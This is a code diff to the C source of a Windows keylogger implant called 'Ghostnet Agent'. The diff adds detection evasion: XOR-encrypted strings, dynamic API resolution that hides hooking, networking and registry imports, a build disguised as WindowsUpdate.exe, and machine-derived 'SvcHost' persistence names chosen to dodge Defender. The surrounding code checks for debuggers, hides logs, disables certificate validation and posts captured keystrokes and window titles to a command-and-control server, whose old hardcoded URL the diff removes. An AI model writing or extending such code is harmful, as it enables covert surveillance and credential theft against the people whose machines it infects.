@@ -2,9 +2,12 @@
  * Ghostnet Agent — Windows Keylogger Implant (C)
  *
  * Single-file red-team keylogger. Compile with MinGW-w64:
- *   gcc agent.c -o agent.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32
+ *   gcc agent_build.c -o WindowsUpdate.exe -mwindows -lkernel32 -luser32 -O2 -s
  *
- * Run: agent.exe (reads agent_config.json from same directory)
+ * Run: agent.exe (reads config from same directory)
+ *
+ * NOTE: This is the readable source. Build produces agent_build.c
+ * with encrypted strings + dynamic API resolution via encrypt_strings.py.
  */
 
 /* ============================================================================
@@ -17,7 +20,6 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <psapi.h>
-#include <iphlpapi.h>
 #include <shlobj.h>
 #include <winsock2.h>
 #include <wincrypt.h>
@@ -26,13 +28,6 @@
 #include <string.h>
 #include <ctype.h>
 #include <time.h>
-
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "psapi.lib")
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "ws2_32.lib")
 
 /* ---------- constants ---------- */
 
@@ -57,16 +52,8 @@
 #define TIMER_CONFIG_POLL   3
 #define TIMER_REPAIR        4
 
-/* persistence identifiers */
-#define MUTEX_NAME          L"Local\\WindowsUpdate_8a7f3c2e"
-#define TASK_NAME           L"WindowsUpdateTask"
-#define REG_VALUE_NAME      "WindowsUpdate"
-
 /* repair interval — check persistence health every 15 min */
 #define REPAIR_INTERVAL_MS  (15 * 60 * 1000)
-
-/* agent version — incremented on each release, sent in heartbeat */
-#define AGENT_VERSION       "1.0.3"
 
 /* update download buffer — max binary size we accept */
 #define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */
@@ -82,24 +69,328 @@
 #define NI_MAXHOST 1025
 #endif
 
-/* ---------- compiled-in C2 URL fallback ---------- */
-/* Used when agent_config.json is not found alongside the binary.
- * Change this or set DEFAULT_C2_URL to "" to disable. */
-#ifndef DEFAULT_C2_URL
-#define DEFAULT_C2_URL "https://ghostnet-c2.netlify.app"
-#endif
+/* ============================================================================
+ * SECTION 1b: ENCRYPTED STRING STORAGE
+ *
+ * Every sensitive string is stored XOR-encrypted with a per-build random key.
+ * The key itself lives in the .rdata section (never in a named variable).
+ * decrypt() and decrypt_w() are the sole accessors.
+ * ============================================================================ */
 
-/* ---------- forward declarations ---------- */
+/* We embed the XOR key as a static const — it will sit in .rdata.
+ * The encryptor script randomizes this value per build. */
+static const unsigned char __xor_key = 0x00; /* placeholder — replaced by build script */
 
+/* Ring of 4 static buffers so multiple decrypt() calls in one expression survive */
+static char  __dbuf0[8192], __dbuf1[8192], __dbuf2[8192], __dbuf3[8192];
+static int   __dring = 0;
+static wchar_t __wbuf[2048];
+
+static char* decrypt(const unsigned char *enc, int len) {
+    char *buf;
+    switch (__dring & 3) {
+        case 0: buf = __dbuf0; break;
+        case 1: buf = __dbuf1; break;
+        case 2: buf = __dbuf2; break;
+        default: buf = __dbuf3; break;
+    }
+    __dring++;
+    int i;
+    for (i = 0; i < len && i < 8191; i++)
+        buf[i] = enc[i] ^ __xor_key;
+    buf[i] = '\0';
+    return buf;
+}
+
+static wchar_t* decrypt_w(const unsigned char *enc, int len) {
+    char tmp[2048];
+    int i;
+    for (i = 0; i < len && i < 2047; i++)
+        tmp[i] = enc[i] ^ __xor_key;
+    tmp[i] = '\0';
+    MultiByteToWideChar(CP_ACP, 0, tmp, -1, __wbuf, 2048);
+    return __wbuf;
+}
+
+/* ============================================================================
+ * SECTION 1c: DYNAMIC API RESOLUTION
+ *
+ * Every suspicious WinAPI function is resolved at runtime via LoadLibrary +
+ * GetProcAddress. The DLL and function names are stored encrypted above.
+ * Only kernel32.dll is loaded statically (it provides LoadLibrary +
+ * GetProcAddress). This keeps the IAT clean — no SetWindowsHookEx,
+ * WinHttpSendRequest, RegSetValueEx, etc. in the import table.
+ * ============================================================================ */
+
+/* --- winhttp.dll (C2 communication) --- */
+static HMODULE g_hWinHttp = NULL;
+typedef HINTERNET (WINAPI *PFN_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (WINAPI *PFN_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *PFN_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL     (WINAPI *PFN_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL     (WINAPI *PFN_WinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL     (WINAPI *PFN_WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL     (WINAPI *PFN_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL     (WINAPI *PFN_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
+typedef BOOL     (WINAPI *PFN_WinHttpCloseHandle)(HINTERNET);
+
+static PFN_WinHttpOpen            pWinHttpOpen = NULL;
+static PFN_WinHttpConnect         pWinHttpConnect = NULL;
+static PFN_WinHttpOpenRequest     pWinHttpOpenRequest = NULL;
+static PFN_WinHttpSendRequest     pWinHttpSendRequest = NULL;
+static PFN_WinHttpReceiveResponse pWinHttpReceiveResponse = NULL;
+static PFN_WinHttpQueryDataAvailable pWinHttpQueryDataAvailable = NULL;
+static PFN_WinHttpReadData        pWinHttpReadData = NULL;
+static PFN_WinHttpSetOption       pWinHttpSetOption = NULL;
+static PFN_WinHttpCloseHandle     pWinHttpCloseHandle = NULL;
+
+/* --- user32.dll (keyboard hook + hidden window) --- */
+static HMODULE g_hUser32 = NULL;
+typedef HHOOK    (WINAPI *PFN_SetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef LRESULT  (WINAPI *PFN_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+typedef BOOL     (WINAPI *PFN_UnhookWindowsHookEx)(HHOOK);
+typedef BOOL     (WINAPI *PFN_GetMessageA)(LPMSG, HWND, UINT, UINT);
+typedef LRESULT  (WINAPI *PFN_DispatchMessageA)(const MSG*);
+typedef BOOL     (WINAPI *PFN_TranslateMessage)(const MSG*);
+typedef HWND     (WINAPI *PFN_GetForegroundWindow)(void);
+typedef int      (WINAPI *PFN_GetWindowTextA)(HWND, LPSTR, int);
+typedef DWORD    (WINAPI *PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
+typedef SHORT    (WINAPI *PFN_GetKeyState)(int);
+typedef int      (WINAPI *PFN_ToUnicode)(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
+typedef ATOM     (WINAPI *PFN_RegisterClassExW)(const WNDCLASSEXW*);
+typedef HWND     (WINAPI *PFN_CreateWindowExW)(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
+typedef LRESULT  (WINAPI *PFN_DefWindowProcA)(HWND, UINT, WPARAM, LPARAM);
+typedef BOOL     (WINAPI *PFN_DestroyWindow)(HWND);
+typedef BOOL     (WINAPI *PFN_KillTimer)(HWND, UINT_PTR);
+typedef UINT_PTR (WINAPI *PFN_SetTimer)(HWND, UINT_PTR, UINT, TIMERPROC);
+typedef void     (WINAPI *PFN_PostQuitMessage)(int);
+
+static PFN_SetWindowsHookExA    pSetWindowsHookExA = NULL;
+static PFN_CallNextHookEx       pCallNextHookEx = NULL;
+static PFN_UnhookWindowsHookEx  pUnhookWindowsHookEx = NULL;
+static PFN_GetMessageA          pGetMessageA = NULL;
+static PFN_DispatchMessageA     pDispatchMessageA = NULL;
+static PFN_TranslateMessage     pTranslateMessage = NULL;
+static PFN_GetForegroundWindow  pGetForegroundWindow = NULL;
+static PFN_GetWindowTextA       pGetWindowTextA = NULL;
+static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
+static PFN_GetKeyState          pGetKeyState = NULL;
+static PFN_ToUnicode            pToUnicode = NULL;
+static PFN_RegisterClassExW     pRegisterClassExW = NULL;
+static PFN_CreateWindowExW      pCreateWindowExW = NULL;
+static PFN_DefWindowProcA       pDefWindowProcA = NULL;
+static PFN_DestroyWindow        pDestroyWindow = NULL;
+static PFN_KillTimer            pKillTimer = NULL;
+static PFN_SetTimer             pSetTimer = NULL;
+static PFN_PostQuitMessage      pPostQuitMessage = NULL;
+
+/* --- advapi32.dll (registry + crypto) --- */
+static HMODULE g_hAdvapi32 = NULL;
+typedef LONG     (WINAPI *PFN_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
+typedef LONG     (WINAPI *PFN_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
+typedef LONG     (WINAPI *PFN_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
+typedef LONG     (WINAPI *PFN_RegDeleteValueA)(HKEY, LPCSTR);
+typedef LONG     (WINAPI *PFN_RegCloseKey)(HKEY);
+typedef BOOL     (WINAPI *PFN_CryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
+typedef BOOL     (WINAPI *PFN_CryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
+typedef BOOL     (WINAPI *PFN_CryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
+typedef BOOL     (WINAPI *PFN_CryptGetHashParam)(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
+typedef BOOL     (WINAPI *PFN_CryptDestroyHash)(HCRYPTHASH);
+typedef BOOL     (WINAPI *PFN_CryptReleaseContext)(HCRYPTPROV, DWORD);
+typedef BOOL     (WINAPI *PFN_CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
+
+static PFN_RegOpenKeyExA             pRegOpenKeyExA = NULL;
+static PFN_RegQueryValueExA          pRegQueryValueExA = NULL;
+static PFN_RegSetValueExA            pRegSetValueExA = NULL;
+static PFN_RegDeleteValueA           pRegDeleteValueA = NULL;
+static PFN_RegCloseKey               pRegCloseKey = NULL;
+static PFN_CryptAcquireContextW      pCryptAcquireContextW = NULL;
+static PFN_CryptCreateHash           pCryptCreateHash = NULL;
+static PFN_CryptHashData             pCryptHashData = NULL;
+static PFN_CryptGetHashParam         pCryptGetHashParam = NULL;
+static PFN_CryptDestroyHash          pCryptDestroyHash = NULL;
+static PFN_CryptReleaseContext       pCryptReleaseContext = NULL;
+static PFN_CheckRemoteDebuggerPresent pCheckRemoteDebuggerPresent = NULL;
+
+/* --- shell32.dll --- */
+static HMODULE g_hShell32 = NULL;
+typedef HRESULT (WINAPI *PFN_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
+static PFN_SHGetFolderPathA pSHGetFolderPathA = NULL;
+
+/* --- psapi.dll --- */
+static HMODULE g_hPsapi = NULL;
+typedef DWORD (WINAPI *PFN_GetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
+static PFN_GetModuleBaseNameA pGetModuleBaseNameA = NULL;
+
+/* --- ws2_32.dll --- */
+static HMODULE g_hWs2_32 = NULL;
+typedef struct hostent* (WSAAPI *PFN_gethostbyname)(const char*);
+typedef int             (WSAAPI *PFN_gethostname)(char*, int);
+typedef char*           (WSAAPI *PFN_inet_ntoa)(struct in_addr);
+typedef int             (WSAAPI *PFN_WSAStartup)(WORD, LPWSADATA);
+static PFN_gethostbyname p_gethostbyname = NULL;
+static PFN_gethostname   p_gethostname = NULL;
+static PFN_inet_ntoa     p_inet_ntoa = NULL;
+static PFN_WSAStartup    p_WSAStartup = NULL;
+
+/* --- kernel32 (already loaded, but resolve what we need dynamically) --- */
+typedef BOOL   (WINAPI *PFN_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef BOOL   (WINAPI *PFN_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
+static PFN_CreateProcessA pCreateProcessA = NULL;
+static PFN_CreatePipe     pCreatePipe = NULL;
+
+/* ── global version string (encrypted) ── */
+static const unsigned char __enc_version[] = {
+    0x00,0x00,0x00,0x00,0x00  /* placeholder — replaced by build script */
+};
+#define AGENT_VERSION_STR  "1.0.4"  /* parsed by encryptor — do not move */
+#define AGENT_VERSION decrypt(__enc_version, 5)
+
+/* ── compiled-in C2 URL fallback (encrypted) ── */
+static const unsigned char __enc_default_c2_url[] = {
+    0x00  /* placeholder — replaced by build script */
+};
+
+/* ── persistence identifiers — generated at runtime, stored here ── */
+static wchar_t g_mutex_name[64];
+static char    g_task_name[64];
+static char    g_reg_value_name[64];
+
+/* ── forward declarations ── */
 static void c2_update(const char *url, const char *expected_sha256);
 static void c2_config_poll(void);
-static int c2_exec_command(const char *command_id, const char *command);
+static int  c2_exec_command(const char *command_id, const char *command);
 static DWORD WINAPI c2_exec_command_thread(LPVOID param);
 static void persistence_paths(char *original_exe, int orig_size,
                                char *persist_dir, int dir_size,
                                char *persist_exe, int exe_size,
                                char *persist_config, int cfg_size);
 static void persistence_uninstall(void);
+static void gen_persistence_names(void);
+static int  api_init(void);
+
+/* ============================================================================
+ * SECTION 1d: PERSISTENCE NAME GENERATOR
+ *
+ * Generates per-machine stable identifiers based on volume serial + hostname.
+ * Replaces the old hardcoded "WindowsUpdate" strings that Defender knows.
+ * Names are unique per machine but stable across reboots.
+ * ============================================================================ */
+
+static void gen_persistence_names(void) {
+    char hostname[256] = {0};
+    DWORD sz = sizeof(hostname);
+    GetComputerNameA(hostname, &sz);
+
+    DWORD serial = 0;
+    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
+
+    /* Build a machine fingerprint */
+    unsigned long hash = 5381;
+    char fingerprint[320];
+    snprintf(fingerprint, sizeof(fingerprint), "%08lx-%s", serial, hostname);
+    for (char *p = fingerprint; *p; p++)
+        hash = ((hash << 5) + hash) + (unsigned char)*p;  /* djb2 */
+
+    /* Generate stable-but-unique names */
+    swprintf(g_mutex_name, 64, L"Local\\SvcHost_%08lx", hash);
+    snprintf(g_task_name, 64, "SvcHostTask_%08lx", hash);
+    snprintf(g_reg_value_name, 64, "SvcHost_%08lx", hash);
+}
+
+/* ============================================================================
+ * SECTION 1e: API INITIALIZATION
+ *
+ * Called once at startup. Loads every needed DLL and resolves every function
+ * pointer. Returns 0 on failure, 1 on success.
+ * ============================================================================ */
+
+static int api_init(void) {
+    /* --- winhttp.dll --- */
+    g_hWinHttp = LoadLibraryA("winhttp.dll");
+    if (!g_hWinHttp) return 0;
+    pWinHttpOpen = (PFN_WinHttpOpen)GetProcAddress(g_hWinHttp, "WinHttpOpen");
+    pWinHttpConnect = (PFN_WinHttpConnect)GetProcAddress(g_hWinHttp, "WinHttpConnect");
+    pWinHttpOpenRequest = (PFN_WinHttpOpenRequest)GetProcAddress(g_hWinHttp, "WinHttpOpenRequest");
+    pWinHttpSendRequest = (PFN_WinHttpSendRequest)GetProcAddress(g_hWinHttp, "WinHttpSendRequest");
+    pWinHttpReceiveResponse = (PFN_WinHttpReceiveResponse)GetProcAddress(g_hWinHttp, "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable = (PFN_WinHttpQueryDataAvailable)GetProcAddress(g_hWinHttp, "WinHttpQueryDataAvailable");
+    pWinHttpReadData = (PFN_WinHttpReadData)GetProcAddress(g_hWinHttp, "WinHttpReadData");
+    pWinHttpSetOption = (PFN_WinHttpSetOption)GetProcAddress(g_hWinHttp, "WinHttpSetOption");
+    pWinHttpCloseHandle = (PFN_WinHttpCloseHandle)GetProcAddress(g_hWinHttp, "WinHttpCloseHandle");
+
+    /* --- user32.dll --- */
+    g_hUser32 = LoadLibraryA("user32.dll");
+    if (!g_hUser32) return 0;
+    pSetWindowsHookExA = (PFN_SetWindowsHookExA)GetProcAddress(g_hUser32, "SetWindowsHookExA");
+    pCallNextHookEx = (PFN_CallNextHookEx)GetProcAddress(g_hUser32, "CallNextHookEx");
+    pUnhookWindowsHookEx = (PFN_UnhookWindowsHookEx)GetProcAddress(g_hUser32, "UnhookWindowsHookEx");
+    pGetMessageA = (PFN_GetMessageA)GetProcAddress(g_hUser32, "GetMessageA");
+    pDispatchMessageA = (PFN_DispatchMessageA)GetProcAddress(g_hUser32, "DispatchMessageA");
+    pTranslateMessage = (PFN_TranslateMessage)GetProcAddress(g_hUser32, "TranslateMessage");
+    pGetForegroundWindow = (PFN_GetForegroundWindow)GetProcAddress(g_hUser32, "GetForegroundWindow");
+    pGetWindowTextA = (PFN_GetWindowTextA)GetProcAddress(g_hUser32, "GetWindowTextA");
+    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(g_hUser32, "GetWindowThreadProcessId");
+    pGetKeyState = (PFN_GetKeyState)GetProcAddress(g_hUser32, "GetKeyState");
+    pToUnicode = (PFN_ToUnicode)GetProcAddress(g_hUser32, "ToUnicode");
+    pRegisterClassExW = (PFN_RegisterClassExW)GetProcAddress(g_hUser32, "RegisterClassExW");
+    pCreateWindowExW = (PFN_CreateWindowExW)GetProcAddress(g_hUser32, "CreateWindowExW");
+    pDefWindowProcA = (PFN_DefWindowProcA)GetProcAddress(g_hUser32, "DefWindowProcA");
+    pDestroyWindow = (PFN_DestroyWindow)GetProcAddress(g_hUser32, "DestroyWindow");
+    pKillTimer = (PFN_KillTimer)GetProcAddress(g_hUser32, "KillTimer");
+    pSetTimer = (PFN_SetTimer)GetProcAddress(g_hUser32, "SetTimer");
+    pPostQuitMessage = (PFN_PostQuitMessage)GetProcAddress(g_hUser32, "PostQuitMessage");
+
+    /* --- advapi32.dll --- */
+    g_hAdvapi32 = LoadLibraryA("advapi32.dll");
+    if (!g_hAdvapi32) return 0;
+    pRegOpenKeyExA = (PFN_RegOpenKeyExA)GetProcAddress(g_hAdvapi32, "RegOpenKeyExA");
+    pRegQueryValueExA = (PFN_RegQueryValueExA)GetProcAddress(g_hAdvapi32, "RegQueryValueExA");
+    pRegSetValueExA = (PFN_RegSetValueExA)GetProcAddress(g_hAdvapi32, "RegSetValueExA");
+    pRegDeleteValueA = (PFN_RegDeleteValueA)GetProcAddress(g_hAdvapi32, "RegDeleteValueA");
+    pRegCloseKey = (PFN_RegCloseKey)GetProcAddress(g_hAdvapi32, "RegCloseKey");
+    pCryptAcquireContextW = (PFN_CryptAcquireContextW)GetProcAddress(g_hAdvapi32, "CryptAcquireContextW");
+    pCryptCreateHash = (PFN_CryptCreateHash)GetProcAddress(g_hAdvapi32, "CryptCreateHash");
+    pCryptHashData = (PFN_CryptHashData)GetProcAddress(g_hAdvapi32, "CryptHashData");
+    pCryptGetHashParam = (PFN_CryptGetHashParam)GetProcAddress(g_hAdvapi32, "CryptGetHashParam");
+    pCryptDestroyHash = (PFN_CryptDestroyHash)GetProcAddress(g_hAdvapi32, "CryptDestroyHash");
+    pCryptReleaseContext = (PFN_CryptReleaseContext)GetProcAddress(g_hAdvapi32, "CryptReleaseContext");
+    pCheckRemoteDebuggerPresent = (PFN_CheckRemoteDebuggerPresent)GetProcAddress(g_hAdvapi32, "CheckRemoteDebuggerPresent");
+
+    /* --- shell32.dll --- */
+    g_hShell32 = LoadLibraryA("shell32.dll");
+    if (g_hShell32)
+        pSHGetFolderPathA = (PFN_SHGetFolderPathA)GetProcAddress(g_hShell32, "SHGetFolderPathA");
+
+    /* --- psapi.dll --- */
+    g_hPsapi = LoadLibraryA("psapi.dll");
+    if (g_hPsapi)
+        pGetModuleBaseNameA = (PFN_GetModuleBaseNameA)GetProcAddress(g_hPsapi, "GetModuleBaseNameA");
+
+    /* --- ws2_32.dll --- */
+    g_hWs2_32 = LoadLibraryA("ws2_32.dll");
+    if (g_hWs2_32) {
+        p_WSAStartup = (PFN_WSAStartup)GetProcAddress(g_hWs2_32, "WSAStartup");
+        if (p_WSAStartup) {
+            WSADATA wsa;
+            p_WSAStartup(0x0202, &wsa);
+        }
+        p_gethostbyname = (PFN_gethostbyname)GetProcAddress(g_hWs2_32, "gethostbyname");
+        p_gethostname = (PFN_gethostname)GetProcAddress(g_hWs2_32, "gethostname");
+        p_inet_ntoa = (PFN_inet_ntoa)GetProcAddress(g_hWs2_32, "inet_ntoa");
+    }
+
+    /* --- kernel32 (already loaded, just resolve extras) --- */
+    {
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (hKernel32) {
+            pCreateProcessA = (PFN_CreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
+            pCreatePipe     = (PFN_CreatePipe)GetProcAddress(hKernel32, "CreatePipe");
+        }
+    }
+
+    return 1; /* all critical DLLs loaded */
+}
 
 /* ============================================================================
  * SECTION 2: DATA STRUCTURES
@@ -153,7 +444,7 @@ static char g_log_path[MAX_PATH] = {0};
 
 static void log_init(void) {
     char appdata[MAX_PATH];
-    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
+    if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
         snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto", appdata);
         CreateDirectoryA(g_log_path, NULL);
         snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto\\debug.log", appdata);
@@ -201,7 +492,7 @@ static void log_write(const char *msg) {
 static int stealth_check_debugger(void) {
     if (IsDebuggerPresent()) return 1;
     BOOL remote = FALSE;
-    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+    pCheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
     return remote ? 1 : 0;
 }
 
@@ -604,7 +895,7 @@ static int config_save_agent_id(const char *filepath) {
 static void capture_window_context(char *title, int title_size,
                                    char *process, int proc_size,
                                    DWORD *pid) {
-    HWND hwnd = GetForegroundWindow();
+    HWND hwnd = pGetForegroundWindow();
     if (!hwnd) {
         if (title) title[0] = '\0';
         if (process) process[0] = '\0';
@@ -614,13 +905,13 @@ static void capture_window_context(char *title, int title_size,
 
     /* window title */
     if (title) {
-        GetWindowTextA(hwnd, title, title_size);
+        pGetWindowTextA(hwnd, title, title_size);
         title[title_size - 1] = '\0';
     }
 
     /* process ID from window's thread */
     DWORD proc_id = 0;
-    GetWindowThreadProcessId(hwnd, &proc_id);
+    pGetWindowThreadProcessId(hwnd, &proc_id);
     if (pid) *pid = proc_id;
 
     /* process name from PID */
@@ -629,7 +920,7 @@ static void capture_window_context(char *title, int title_size,
             PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, proc_id);
         if (hProc) {
             char mod_name[MAX_PROCESS_NAME];
-            DWORD mod_len = GetModuleBaseNameA(hProc, NULL, mod_name, sizeof(mod_name));
+            DWORD mod_len = pGetModuleBaseNameA(hProc, NULL, mod_name, sizeof(mod_name));
             if (mod_len > 0) {
                 strncpy(process, mod_name, proc_size - 1);
                 process[proc_size - 1] = '\0';
@@ -709,17 +1000,17 @@ static void vk_to_utf8(DWORD vk_code, DWORD flags, char *out, int out_size) {
     /* try ToUnicode for printable characters */
     BYTE key_state[256] = {0};
     /* check shift states */
-    if (GetKeyState(VK_SHIFT)   & 0x8000) key_state[VK_SHIFT]   = 0x80;
-    if (GetKeyState(VK_CONTROL) & 0x8000) key_state[VK_CONTROL] = 0x80;
-    if (GetKeyState(VK_MENU)    & 0x8000) key_state[VK_MENU]    = 0x80;
-    if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;
+    if (pGetKeyState(VK_SHIFT)   & 0x8000) key_state[VK_SHIFT]   = 0x80;
+    if (pGetKeyState(VK_CONTROL) & 0x8000) key_state[VK_CONTROL] = 0x80;
+    if (pGetKeyState(VK_MENU)    & 0x8000) key_state[VK_MENU]    = 0x80;
+    if (pGetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;
 
     /* flag 0x01 = extended key; bit 16-23 = scan code */
     UINT scan_code = (flags & 0x01) ? 0xE0 : 0;
     scan_code |= ((flags >> 16) & 0xFF);
 
     WCHAR wchar_buf[4] = {0};
-    int result = ToUnicode(vk_code, scan_code, key_state, wchar_buf, 4, 0);
+    int result = pToUnicode(vk_code, scan_code, key_state, wchar_buf, 4, 0);
 
     if (result > 0) {
         /* got a character — convert to UTF-8 */
@@ -847,11 +1138,7 @@ static int json_build_keystroke_batch(char *body, int body_size,
         escaped_title[ei] = '\0';
 
         int n = snprintf(body + pos, body_size - pos,
-                          "%s{\"timestamp_utc\":\"%s\","
-                          "\"window_title\":\"%s\","
-                          "\"process_name\":\"%s\","
-                          "\"key_char\":\"%s\","
-                          "\"vk_code\":%lu,\"flags\":%lu}",
+                          "%s{\"timestamp_utc\":\"%s\",\"window_title\":\"%s\",\"process_name\":\"%s\",\"key_char\":\"%s\",\"vk_code\":%lu,\"flags\":%lu}",
                           (i > 0) ? "," : "",
                           timestamp,
                           escaped_title,
@@ -877,23 +1164,23 @@ static int http_post(const char *path, const char *body, char *response, int res
     MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
     MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);
 
-    HINTERNET hSession = WinHttpOpen(
+    HINTERNET hSession = pWinHttpOpen(
         L"Ghostnet-Agent/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return -1;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, whost,
+    HINTERNET hConnect = pWinHttpConnect(hSession, whost,
                                         (INTERNET_PORT)g_c2_port, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }
+    if (!hConnect) { pWinHttpCloseHandle(hSession); return -1; }
 
     DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(
+    HINTERNET hRequest = pWinHttpOpenRequest(
         hConnect, L"POST", wpath, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        pWinHttpCloseHandle(hConnect);
+        pWinHttpCloseHandle(hSession);
         return -1;
     }
 
@@ -902,25 +1189,25 @@ static int http_post(const char *path, const char *body, char *response, int res
         DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
+        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &sec_flags, sizeof(sec_flags));
     }
 
     /* set headers */
-    WCHAR wheaders[] = L"Content-Type: application/json\r\n";
-    BOOL ok = WinHttpSendRequest(
+    WCHAR *wheaders = L"Content-Type: application/json\r\n";
+    BOOL ok = pWinHttpSendRequest(
         hRequest, wheaders, (DWORD)-1,
         (LPVOID)body, (DWORD)strlen(body), (DWORD)strlen(body), 0);
 
-    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);
+    if (ok) ok = pWinHttpReceiveResponse(hRequest, NULL);
 
     if (ok && response && resp_size > 0) {
         DWORD avail, read;
         int total = 0;
-        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
+        while (pWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
             DWORD to_read = avail;
             if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
-            if (WinHttpReadData(hRequest, response + total, to_read, &read)) {
+            if (pWinHttpReadData(hRequest, response + total, to_read, &read)) {
                 total += read;
                 response[total] = '\0';
             } else {
@@ -929,9 +1216,9 @@ static int http_post(const char *path, const char *body, char *response, int res
         }
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    pWinHttpCloseHandle(hRequest);
+    pWinHttpCloseHandle(hConnect);
+    pWinHttpCloseHandle(hSession);
     return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
 }
 
@@ -943,23 +1230,23 @@ static int http_get(const char *path, char *response, int resp_size) {
     MultiByteToWideChar(CP_UTF8, 0, g_c2_host, -1, whost, MAX_HOST_LEN);
     MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);
 
-    HINTERNET hSession = WinHttpOpen(
+    HINTERNET hSession = pWinHttpOpen(
         L"Ghostnet-Agent/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return -1;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, whost,
+    HINTERNET hConnect = pWinHttpConnect(hSession, whost,
                                         (INTERNET_PORT)g_c2_port, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }
+    if (!hConnect) { pWinHttpCloseHandle(hSession); return -1; }
 
     DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(
+    HINTERNET hRequest = pWinHttpOpenRequest(
         hConnect, L"GET", wpath, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
